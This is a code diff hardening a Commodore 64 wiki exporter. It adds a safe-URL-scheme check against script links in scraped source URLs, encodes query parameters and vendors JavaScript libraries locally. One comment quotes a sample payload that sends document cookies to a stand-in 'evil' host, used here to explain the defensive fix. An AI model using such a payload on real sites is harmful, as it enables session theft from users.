@@ -43,6 +43,29 @@ from matplotlib.patches import Rectangle, FancyBboxPatch
 import numpy as np
 from functools import partial
 import multiprocessing
+from urllib.parse import quote as _urlquote
+
+
+# Schemes allowed to appear in a generated href. Document source_url values
+# come from scraped pages, so they are attacker-influenced content: an entry
+# like "javascript:fetch('//evil/'+document.cookie)" contains no HTML
+# metacharacters at all, so html.escape() passes it through untouched and it
+# becomes a live script-executing link in the exported wiki.
+_SAFE_URL_SCHEMES = ('http://', 'https://', 'mailto:')
+
+
+def safe_external_url(url: Any) -> str:
+    """HTML-escape a URL for an href, or return '' if its scheme isn't safe."""
+    if not url:
+        return ''
+    if not str(url).strip().lower().startswith(_SAFE_URL_SCHEMES):
+        return ''
+    return html.escape(str(url).strip(), quote=True)
+
+
+def url_query_value(value: Any) -> str:
+    """Percent-encode a value for use inside a generated URL query string."""
+    return _urlquote(str(value or ''), safe='')
 
 
 class WikiExporter:
@@ -1274,6 +1297,12 @@ python wiki_export.py --output {self.output_dir.name}
         # Build tags HTML
         tags_html = ' '.join(f'<span class="tag">{html.escape(tag)}</span>' for tag in doc['tags'])
 
+        # Scraped source URLs are untrusted input - drop any non-http(s) scheme
+        # rather than emitting it as a clickable link (see safe_external_url).
+        safe_source_url = safe_external_url(doc.get('source_url'))
+        if doc.get('source_url') and not safe_source_url:
+            print(f"  [WARN] Dropping unsafe source_url on '{doc['title']}': {doc['source_url']!r}")
+
         html_content = f"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1317,8 +1346,8 @@ python wiki_export.py --output {self.output_dir.name}
                         {f'<span class="meta-item">📑 {doc["total_pages"]} pages</span>' if doc['total_pages'] else ''}
                     </div>
                     {f'<div class="doc-tags">{tags_html}</div>' if tags_html else ''}
-                    {f'<div class="doc-url"><a href="{html.escape(doc["source_url"])}" target="_blank">🔗 Source URL</a></div>' if doc.get('source_url') else ''}
-                    {f'<div class="doc-url"><a href="../viewer.html?file={doc["file_path_in_wiki"]}&name={html.escape(doc["filename"])}&type={doc["file_type"]}" target="_blank" style="background: var(--accent-color); color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; display: inline-block; margin-top: 10px;">📄 View Source File</a></div>' if doc.get('file_path_in_wiki') else ''}
+                    {f'<div class="doc-url"><a href="{safe_source_url}" target="_blank" rel="noopener noreferrer">🔗 Source URL</a></div>' if safe_source_url else ''}
+                    {f'<div class="doc-url"><a href="../viewer.html?file={url_query_value(doc["file_path_in_wiki"])}&amp;name={url_query_value(doc["filename"])}&amp;type={url_query_value(doc["file_type"])}" target="_blank" style="background: var(--accent-color); color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; display: inline-block; margin-top: 10px;">📄 View Source File</a></div>' if doc.get('file_path_in_wiki') else ''}
                 </div>
 
                 <div class="chunks-container">
@@ -1855,7 +1884,7 @@ python wiki_export.py --output {self.output_dir.name}
         </div>
     </div>
 
-    <script src="https://d3js.org/d3.v7.min.js"></script>
+    <script src="lib/d3.v7.min.js"></script>
     <script src="lib/fuse.min.js"></script>
     <script src="assets/js/search.js"></script>
     <script src="assets/js/enhancements.js"></script>
@@ -3996,7 +4025,7 @@ python wiki_export.py --output {self.output_dir.name}
         </footer>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/marked@11.1.0/marked.min.js"></script>
+    <script src="lib/marked.min.js"></script>
     <script>
         // Get file path from URL parameter
         const urlParams = new URLSearchParams(window.location.search);
@@ -8853,13 +8882,13 @@ function highlightSyntax() {
         let code = block.textContent;
 
         // Detect if this is BASIC or Assembly code
-        const isBASIC = /^\s*\d+\s+(PRINT|REM|FOR|NEXT|IF|THEN|GOTO|GOSUB|INPUT|LET|DIM|DATA|READ|POKE|PEEK|SYS)/im.test(code);
+        const isBASIC = /^\\s*\\d+\\s+(PRINT|REM|FOR|NEXT|IF|THEN|GOTO|GOSUB|INPUT|LET|DIM|DATA|READ|POKE|PEEK|SYS)/im.test(code);
 
         if (isBASIC) {
             // BASIC syntax highlighting
 
             // 1. Highlight line numbers
-            code = code.replace(/^\s*(\d+)\s+/gm, match => `<span class="basic-linenum">${match}</span>`);
+            code = code.replace(/^\\s*(\\d+)\\s+/gm, match => `<span class="basic-linenum">${match}</span>`);
 
             // 2. Highlight BASIC keywords
             const basicKeywords = 'PRINT|REM|FOR|NEXT|IF|THEN|ELSE|GOTO|GOSUB|RETURN|INPUT|LET|DIM|DATA|READ|RESTORE|POKE|PEEK|SYS|END|STOP|LOAD|SAVE|RUN|LIST|NEW|CLR|GET|TAB|SPC|AND|OR|NOT|TO|STEP|FN|DEF|ON';
@@ -8875,7 +8904,7 @@ function highlightSyntax() {
             code = code.replace(funcRegex, match => `<span class="basic-function">${match.toUpperCase()}</span>`);
 
             // 5. Highlight REM comments
-            code = code.replace(/\bREM\s+.*/gi, match => `<span class="basic-comment">${match}</span>`);
+            code = code.replace(/\\bREM\\s+.*/gi, match => `<span class="basic-comment">${match}</span>`);
 
         } else {
             // 6502/6510 Assembly syntax highlighting
@@ -8884,13 +8913,13 @@ function highlightSyntax() {
             code = code.replace(/;.*/g, match => `<span class="asm-comment">${match}</span>`);
 
             // 2. Highlight hex values ($xx, $xxxx)
-            code = code.replace(/\$[0-9A-Fa-f]+/g, match => `<span class="asm-hex">${match}</span>`);
+            code = code.replace(/\\$[0-9A-Fa-f]+/g, match => `<span class="asm-hex">${match}</span>`);
 
             // 3. Highlight binary values (%)
             code = code.replace(/%[01]+/g, match => `<span class="asm-binary">${match}</span>`);
 
             // 4. Highlight decimal numbers
-            code = code.replace(/\b\d+\b/g, match => `<span class="asm-number">${match}</span>`);
+            code = code.replace(/\\b\\d+\\b/g, match => `<span class="asm-number">${match}</span>`);
 
             // 5. Highlight opcodes (all 56 6502 instructions)
             const opcodes = 'ADC|AND|ASL|BCC|BCS|BEQ|BIT|BMI|BNE|BPL|BRK|BVC|BVS|CLC|CLD|CLI|CLV|CMP|CPX|CPY|DEC|DEX|DEY|EOR|INC|INX|INY|JMP|JSR|LDA|LDX|LDY|LSR|NOP|ORA|PHA|PHP|PLA|PLP|ROL|ROR|RTI|RTS|SBC|SEC|SED|SEI|STA|STX|STY|TAX|TAY|TSX|TXA|TXS|TYA';
@@ -8898,10 +8927,10 @@ function highlightSyntax() {
             code = code.replace(opcodeRegex, match => `<span class="asm-opcode">${match.toUpperCase()}</span>`);
 
             // 6. Highlight labels (word followed by :)
-            code = code.replace(/^(\w+):/gm, match => `<span class="asm-label">${match}</span>`);
+            code = code.replace(/^(\\w+):/gm, match => `<span class="asm-label">${match}</span>`);
 
             // 7. Highlight directives (.byte, .word, etc.)
-            code = code.replace(/\.\w+/g, match => `<span class="asm-directive">${match}</span>`);
+            code = code.replace(/\\.\\w+/g, match => `<span class="asm-directive">${match}</span>`);
         }
 
         block.innerHTML = code;
@@ -9683,16 +9712,16 @@ For the full AI assistant, we'd integrate:
                 text: `To change the border color on the C64, write to address $D020 (53280 decimal).
 
 **In BASIC:**
-\`\`\`
+\\`\\`\\`
 POKE 53280, 0   ; Black border
 POKE 53280, 1   ; White border
-\`\`\`
+\\`\\`\\`
 
 **In Assembly:**
-\`\`\`
+\\`\\`\\`
 LDA #$00        ; Black
 STA $D020       ; Write to border color register
-\`\`\`
+\\`\\`\\`
 
 Color values range from 0-15. The VIC-II chip controls this register.`,
                 sources: [
@@ -9706,7 +9735,7 @@ Color values range from 0-15. The VIC-II chip controls this register.`,
 The VIC-II chip provides 8 hardware sprites (24x21 pixels each).
 
 **Basic sprite setup:**
-\`\`\`
+\\`\\`\\`
 ; Enable sprite 0
 LDA #$01
 STA $D015       ; Sprite enable register
@@ -9722,7 +9751,7 @@ STA $D001       ; Sprite 0 Y position
 ; Set sprite pointer (shape)
 LDA #13
 STA $07F8       ; Sprite 0 pointer
-\`\`\`
+\\`\\`\\`
 
 Sprite data is 63 bytes (24x21 bits + 1 padding).`,
                 sources: [
@@ -9736,7 +9765,7 @@ Sprite data is 63 bytes (24x21 bits + 1 padding).`,
 The SID chip ($D400-$D7FF) has 3 independent voices.
 
 **Simple beep on Voice 1:**
-\`\`\`
+\\`\\`\\`
 LDA #$0F
 STA $D418       ; Max volume
 
@@ -9752,7 +9781,7 @@ STA $D400       ; Frequency low
 
 LDA #$11
 STA $D404       ; Triangle wave + gate on
-\`\`\``,
+\\`\\`\\``,
                 sources: [
                     { title: 'SID Article', url: 'articles/SID.html' },
                     { title: 'Sound Article', url: 'articles/Sound.html' }
@@ -9761,7 +9790,7 @@ STA $D404       ; Triangle wave + gate on
             'memory map': {
                 text: `**C64 Memory Map:**
 
-\`\`\`
+\\`\\`\\`
 $0000-$00FF  Zero Page (256 bytes)
 $0100-$01FF  Stack (256 bytes)
 $0200-$03FF  OS/BASIC workspace
@@ -9775,7 +9804,7 @@ $D000-$DFFF  I/O area (4K)
   $DC00-$DCFF  CIA #1 registers
   $DD00-$DDFF  CIA #2 registers
 $E000-$FFFF  Kernal ROM (8K)
-\`\`\`
+\\`\\`\\`
 
 Total: 64K addressable memory with bank switching.`,
                 sources: [
@@ -9938,61 +9967,57 @@ window.wikiEnhancements = {
                 f.write(content)
             print(f"  Created: assets/js/{filename}")
 
+    # Every third-party script the exported wiki loads. All of them are
+    # vendored into lib/ rather than referenced from a CDN, so the exported
+    # wiki works offline and doesn't change behaviour when an upstream CDN
+    # moves or rewrites a version. d3 (knowledge graph) and marked (file
+    # viewer) used to be the exceptions - they were loaded straight from a
+    # CDN, which silently broke those two pages with no network.
+    _JS_LIBRARIES = (
+        # (display name, url, local filename, what breaks without it)
+        ("Fuse.js", "https://cdn.jsdelivr.net/npm/fuse.js@7.0.0/dist/fuse.min.js",
+         "fuse.min.js", "search functionality will be limited"),
+        ("PDF.js", "https://cdn.jsdelivr.net/npm/pdfjs-dist@3.11.174/build/pdf.min.js",
+         "pdf.min.js", "PDF viewing will not work"),
+        ("PDF.js worker", "https://cdn.jsdelivr.net/npm/pdfjs-dist@3.11.174/build/pdf.worker.min.js",
+         "pdf.worker.min.js", "PDF viewing will not work"),
+        ("D3.js", "https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js",
+         "d3.v7.min.js", "the knowledge graph page will not render"),
+        ("Marked", "https://cdn.jsdelivr.net/npm/marked@11.1.0/marked.min.js",
+         "marked.min.js", "markdown files will render as plain text"),
+    )
+
     def _download_libraries(self):
-        """Download required JavaScript libraries."""
+        """Vendor every third-party JS library into lib/ for offline use."""
         import urllib.request
 
         lib_dir = self.output_dir / "lib"
+        lib_dir.mkdir(parents=True, exist_ok=True)
 
-        # Fuse.js - lightweight fuzzy search library
-        fuse_url = "https://cdn.jsdelivr.net/npm/fuse.js@7.0.0/dist/fuse.min.js"
-        fuse_path = lib_dir / "fuse.min.js"
+        for name, url, filename, consequence in self._JS_LIBRARIES:
+            path = lib_dir / filename
 
-        try:
-            print(f"  Downloading Fuse.js...")
-            urllib.request.urlretrieve(fuse_url, fuse_path)
-            print(f"  Downloaded: lib/fuse.min.js")
-        except Exception as e:
-            print(f"  Warning: Could not download Fuse.js: {e}")
-            print(f"  Creating fallback notice...")
+            # An export re-run shouldn't re-download what's already vendored,
+            # but a previous run's fallback stub must not be mistaken for the
+            # real library (stubs are a few hundred bytes at most).
+            if path.exists() and path.stat().st_size > 4096:
+                print(f"  Already vendored: lib/{filename}")
+                continue
 
-            # Create a fallback file with instructions
-            fallback = """// Fuse.js could not be downloaded automatically.
-// Please download from: https://cdn.jsdelivr.net/npm/fuse.js@7.0.0/dist/fuse.min.js
-// Or use CDN in HTML: <script src="https://cdn.jsdelivr.net/npm/fuse.js@7.0.0"></script>
-
-console.warn('Fuse.js not loaded - search functionality will be limited');
-"""
-            with open(fuse_path, 'w', encoding='utf-8') as f:
-                f.write(fallback)
-
-        # PDF.js - PDF viewer library
-        pdf_url = "https://cdn.jsdelivr.net/npm/pdfjs-dist@3.11.174/build/pdf.min.js"
-        pdf_worker_url = "https://cdn.jsdelivr.net/npm/pdfjs-dist@3.11.174/build/pdf.worker.min.js"
-        pdf_path = lib_dir / "pdf.min.js"
-        pdf_worker_path = lib_dir / "pdf.worker.min.js"
-
-        try:
-            print(f"  Downloading PDF.js...")
-            urllib.request.urlretrieve(pdf_url, pdf_path)
-            print(f"  Downloaded: lib/pdf.min.js")
-
-            print(f"  Downloading PDF.js worker...")
-            urllib.request.urlretrieve(pdf_worker_url, pdf_worker_path)
-            print(f"  Downloaded: lib/pdf.worker.min.js")
-        except Exception as e:
-            print(f"  Warning: Could not download PDF.js: {e}")
-            print(f"  PDF viewing will not be available")
-
-            # Create a fallback file with instructions
-            fallback = """// PDF.js could not be downloaded automatically.
-// Please download from: https://cdn.jsdelivr.net/npm/pdfjs-dist@3.11.174/build/pdf.min.js
-// and https://cdn.jsdelivr.net/npm/pdfjs-dist@3.11.174/build/pdf.worker.min.js
-
-console.warn('PDF.js not loaded - PDF viewing will not work');
-"""
-            with open(pdf_path, 'w', encoding='utf-8') as f:
-                f.write(fallback)
+            try:
+                print(f"  Downloading {name}...")
+                urllib.request.urlretrieve(url, path)
+                print(f"  Downloaded: lib/{filename}")
+            except Exception as e:
+                print(f"  Warning: Could not download {name}: {e}")
+                print(f"  Consequence: {consequence}")
+                path.write_text(
+                    f"// {name} could not be downloaded automatically.\n"
+                    f"// Download it from: {url}\n"
+                    f"// and save it as lib/{filename}\n\n"
+                    f"console.warn('{name} not loaded - {consequence}');\n",
+                    encoding='utf-8',
+                )
 
     def _generate_articles(self, entities_data: Dict):
         """Generate articles for major entities and topics (parallelized)."""
